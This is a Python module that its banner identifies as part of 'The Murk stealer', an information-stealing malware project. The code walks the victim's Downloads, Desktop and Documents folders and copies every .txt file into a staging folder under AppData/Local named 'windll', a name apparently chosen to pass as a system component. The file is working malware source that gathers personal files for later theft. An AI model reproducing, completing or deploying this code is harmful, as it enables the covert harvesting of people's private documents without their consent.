#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ, walk
from os.path import join
from shutil import copy2
from manager.logger import Log

def copy_txt_files(source_folder, destination_folder):
	try:
		for root, dirs, files in walk(source_folder):
			for file in files:
				if file.endswith('.txt'):
					source_path = join(root, file)
					destination_path = join(destination_folder, file)
					copy2(source_path, destination_path)
	except Exception as error:
		Log(error)

def TxtFiles():
	Log("===========TxtFiles===========")
	path = environ['USERPROFILE']

	destination_folder = fr"{path}/AppData/Local/windll/Files/"
	downloads = fr"{path}/Downloads"
	desktop = fr"{path}/Desktop"
	documents = fr"{path}/Documents"

	copy_txt_files(downloads, destination_folder+"Downloads")
	copy_txt_files(desktop, destination_folder+"Desktop")
	copy_txt_files(documents, destination_folder+"Documents")

